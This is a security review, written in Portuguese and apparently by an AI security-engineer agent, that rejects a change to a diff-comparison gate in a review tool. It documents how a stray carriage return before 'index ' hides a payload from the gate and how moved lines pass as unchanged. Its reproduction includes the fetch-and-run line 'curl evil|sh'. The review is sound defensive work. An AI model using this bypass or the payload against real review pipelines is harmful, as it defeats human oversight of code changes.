---
tipo: revisao-seguranca
contrato: 1
pedido: portao-diff-proprio
branch: melhoria/portao-diff-proprio
commit: 3a2f0430b3c627613907bc849f632e6fa8ebe4bb
parecer: reprovado
revisor: forge:security-engineer
data: 2026-10-15
---
# Review de segurança: portao-diff-proprio

Escopo: `git diff b5411e9..HEAD` em `bin/forge-check`, `tests/`, `docs/adr/` (HEAD c0e8edf; commit revisado 3a2f043). Estático; reproduções só em repositório temporário.

## Gatilhos
`R-SEGURANCA`: afrouxamento de portão do Forge (comparação do parecer com o diff efetivo, ADR 0004 item 3) e efeito na catraca (`tests/catraca.py:484` usa `mesmo_diff`, a mesma função, para o rótulo `afrouxa-regra`).

## Achados

### S-1 (alta) Conteúdo escondido do portão por separador de linha do Python
- Evidência: `bin/forge-check:238-263` (`diff_efetivo`: `saida.splitlines()` e descarte das linhas que começam com `index ` ou `@@ `).
- Caminho de ataque: `str.splitlines()` também quebra em `\r` isolado, `\x0b`, `\x0c`, `\x1c-\x1e`, `\x85`, ` `, ` `. Quem empurra para a branch depois do parecer (agente induzido por prompt injection, ou colaborador) acrescenta a uma linha adicionada um `\r` seguido de `index ` (ou `@@ `) e do payload. O normalizador trata o resto como cabeçalho git e o descarta; o texto comparado fica igual ao do parecer, `commit_vale` devolve None e o portão (e a catraca) aceita conteúdo nunca revisado. Reproduzido em repositório temporário: parecer com a linha `x`; commit seguinte troca por `x<CR>index ; curl evil|sh`; `commit_vale(..., base="develop")` retornou None (valido). Vale para qualquer arquivo fora de `LIVRES`, inclusive scripts, hooks e workflows (estes ainda cobertos pela catraca por caminho, mas com o mesmo atalho no `afrouxa-regra`).
- Correção mínima: separar por `"\n"` (`saida.split("\n")`), nunca `splitlines()`; opcionalmente decodificar com `errors="surrogateescape"` e testar uma linha com `\r index`, ` @@` e `\x0cdiff --git`. Só é cabeçalho a linha que o git emitiu como tal; como o diff `-U0` com `--no-ext-diff` só emite `index ` no cabeçalho, também dá para descartar `index ` apenas entre `diff --git` e o primeiro `@@`/`---`.
- Esforço: P. Dono: tech-lead (implementação) com teste novo.

### S-2 (média) Linha movida no mesmo arquivo passa como igual
- Evidência: `bin/forge-check:240-243` e `:255-256` (`-U0`, números de `@@` descartados; só a sequência de linhas `+`/`-` é comparada); a emenda em `docs/adr/0004-...md` declara "módulo número de linha e contexto".
- Caminho de ataque: mover uma linha adicionada de posição (por exemplo, uma guarda `if`/`exit` de antes para depois da chamada que ela protegia) mantém as mesmas linhas `+`, na mesma ordem relativa; o texto normalizado fica idêntico. Reproduzido: linha `GUARD` inserida após `a`, depois movida para antes de `e`; `commit_vale` retornou None. Idem para remoção de linha duplicada em outro ponto (por exemplo `fi`, `}`). É o custo conhecido de ignorar a posição; a ADR não o registra como risco, e a revisão não vê o deslocamento. Exige commit na branch depois do parecer, portanto a mesma classe de ator do S-1, mas sem truque técnico.
- Correção mínima: ou (a) manter alguma âncora na comparação (por exemplo `-U1` ou a linha de contexto imediatamente anterior a cada trecho, ainda sem número), aceitando mais falso positivo quando a base mexe ao lado; ou (b) registrar o risco na ADR como risco aceito pelo dono (aceite em `docs/security/aceites/`, que não gravo). Recomendo (a) ou (b) explícito; não deixar implícito.
- Esforço: P a M. Dono: tech-lead; decisão entre (a) e (b) do dono (`R-DECISAO`).

## Caminhos verificados sem achado
- Renomeação: `--no-renames` mantido; vira apagar e criar, dois arquivos no mapa; qualquer diferença aparece.
- Binários: `--binary` mantém o corpo `GIT BINARY PATCH`; só a linha `index` sai; conteúdo diferente diverge.
- Modo de arquivo, criado, apagado, symlink: linhas `old mode`/`new mode`/`new file mode`/`deleted file mode` ficam no texto do arquivo.
- Arquivo que sai ou entra no conjunto: `da.keys() | db.keys()` cobre os dois lados (get devolve None contra texto).
- Resolução de merge com alteração só nela: o diff do HEAD contra o merge-base novo inclui a linha; coberto por teste `test_c` e confirmado na leitura.
- Separadores de trecho: todos viram `@@`; trechos que se fundem ou separam divergem (falso positivo, seguro). O efeito de fundir dois `@@` em um, com a mesma sequência de linhas, é o S-2.
- `commit_vale` sem `base`: continua estrito (`test_sem_base_continua_estrito`); falha do git: `None` do diff dá divergência `[]`? Não: `arquivos_divergentes` devolve None, `mesmo_diff` retorna False; em `commit_vale` o `div` None cai no motivo com `fora[0]` (fecha, bloqueia).
- Mensagem do motivo: `alvo` vem do cabeçalho, sem execução; sem injeção.
- Catraca: não mudou, herda os S-1 e S-2 via `forge_check().mesmo_diff` (`tests/catraca.py:484`): o rótulo `afrouxa-regra` fica válido após mudança escondida pelo S-1. Arquivos de controle seguem exigindo o rótulo por caminho (`tests/catraca.py:38,387`), mas o rótulo antigo passa a cobrir conteúdo novo.

## Riscos aceitos e ferramentas
Nenhum risco aceito; S-2 pode virar `riscos-aceitos` se o dono preferir (gravar o aceite com `commit:` igual ao do parecer novo). Ferramentas: só `git` e `python3` locais; gitleaks, semgrep, zizmor, osv-scanner não usados (alvo é um script e sua ADR; sem segredo nem dependência novas). Nenhuma lacuna relevante.

## Plano em cartões
1. tech-lead: trocar `splitlines()` por `split("\n")` em `diff_efetivo` e testes com `\r`, `\x0c`, ` ` antes de `index `, `@@ `, `diff --git ` (S-1). Reprovação cai com este cartão e novo parecer sobre o novo HEAD.
2. tech-lead + dono: S-2, âncora de contexto ou risco aceito registrado na ADR.
